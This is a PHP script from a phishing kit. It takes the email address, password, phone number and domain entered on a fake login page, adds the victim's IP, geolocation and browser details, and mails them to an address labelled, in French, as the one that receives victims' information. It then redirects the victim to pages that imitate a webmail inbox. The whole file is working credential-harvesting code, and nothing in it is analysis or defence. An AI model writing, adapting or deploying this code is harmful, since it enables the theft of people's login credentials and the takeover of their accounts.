<?php
$country = visitor_country();
$countryCode = visitor_countryCode();
$continentCode = visitor_continentCode();
$regionName = visitor_regionName();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['username'];
$pass = $_POST['password'];
$domain = $_POST['domain'];
$pnum = $_POST['Phone_Number'];
$own = 'METTRE-EMAIL-QUI-RECOIT-LES-INFOS-DES-VICTIMES';
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$server = date("D/M/d, Y g:i a"); 
$sender = 'result';
$page = 'Internal System';
$subj = "Nouveau message :: $page";
$headers .= "From: Internal System<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = '';
$msg = "<HTML><BODY><TABLE>
 <tr><td>________<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>Informations<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>_________</td></tr>
 <tr><td>Adresse Email: $email</td></tr>
 <tr><td>Mot de passe: $pass</td></tr>
 <tr><td>Telephone: $pnum</td></tr>
 <tr><td>________<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>D&eacute;tails<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>__________</td></tr>
 <tr><td>Pays: $country | Adresse IP: <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> | <img src='http://www.translatorscafe.com/cafe/images/flags/$countryCode.gif' height='12' /> | $countryCode | $continentCode | $regionName | Date: $server </td></tr>
 <tr><td>User-Agent: '$browser' 
 <br />URL: https://$web$inj </td></tr>
 </BODY>
 </HTML>";
if (empty($email) || empty($pass)) {
header( "Location: index.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$email&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: success.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$email&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function visitor_countryCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $result = $ip_data->geoplugin_countryCode;
    }

    return $result;
}
function visitor_regionName()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_regionName != null)
    {
        $result = $ip_data->geoplugin_regionName;
    }

    return $result;
}
function visitor_continentCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_continentCode != null)
    {
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
}
?>
